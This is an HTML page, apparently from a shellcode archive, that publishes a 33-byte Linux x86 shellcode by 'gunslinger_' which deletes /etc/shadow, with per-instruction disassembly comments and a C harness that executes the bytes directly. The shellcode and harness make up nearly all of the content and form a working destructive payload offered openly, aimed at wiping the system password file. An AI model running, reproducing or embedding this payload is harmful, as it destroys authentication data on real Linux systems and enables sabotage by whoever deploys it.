<html><head><title>Linux/x86 - unlink /etc/shadow - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Name   : 33 bytes unlink &quot;/etc/shadow&quot; x86 linux shellcode
Date   : Wed Jun  2 18:01:44 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
*/
#include &lt;stdio.h&gt;

char *shellcode=
		&quot;\xeb\x0f&quot;                    /* jmp    0x8048071 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x0a&quot;                    /* mov    $0xa,%al */
		&quot;\x5b&quot;                        /* pop    %ebx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
		&quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\xe8\xec\xff\xff\xff&quot;        /* call   0x8048062 */
		&quot;\x2f&quot;                        /* das     */
		&quot;\x65&quot;                        /* gs */
		&quot;\x74\x63&quot;                    /* je     0x80480dd */
		&quot;\x2f&quot;                        /* das     */
		&quot;\x73\x68&quot;                    /* jae    0x80480e5 */
		&quot;\x61&quot;                        /* popa    */
		&quot;\x64\x6f&quot;                    /* outsl  %fs		&quot;(%esi),(%dx) */
		&quot;\x77&quot;;                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
